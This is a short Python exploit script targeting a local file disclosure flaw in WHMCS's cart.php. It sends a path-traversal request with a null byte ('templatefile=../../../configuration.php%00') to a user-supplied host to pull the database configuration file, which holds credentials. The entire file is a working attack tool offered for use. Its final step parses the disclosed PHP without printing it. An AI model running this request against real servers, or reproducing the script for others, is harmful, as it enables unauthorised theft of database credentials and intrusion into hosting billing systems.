# whmcs.py
# description: Gets the database config if it is vulnerable to WHMCS cart.php Local File Disclosure
# author: @shipcod3
# reference: http://packetstormsecurity.com/files/106602/whmcs3x-disclose.txt

import sys
from urllib import urlopen
import re
import string

code_regexp = re.compile("<\?php.+\?>",re.DOTALL)

def get_code(inp):
    blocks = code_regexp.findall(inp)
    lines = []
    for block in blocks:
        lines+=[line.strip() for line in block.split(";")]
    return lines

def usage(): 
    print("USAGE: python filename www.host.com 80")
    print("       python filename www.host.com 443")

def whmcs_exploit(argv):
    if len(argv) < 3: 
        return usage()
    
    base = argv[1]
    
    if sys.argv[2] == '80':
        vulne = "http://{}/cart.php?a=account&templatefile=../../../configuration.php%00".format(base)
        print("Exploiting >>  {}".format(vulne))

        f = urlopen(vulne)
        code = get_code(f.read())
        
    elif sys.argv[2] == '443':
        vulne = "https://{}/cart.php?a=account&templatefile=../../../configuration.php%00".format(base)
        print("Exploiting >>  {}".format(vulne))

        f = urlopen(vulne)
        code = get_code(f.read())
    
    else:
        print ('[!] Error')
    
if __name__ == "__main__":
    whmcs_exploit(sys.argv)
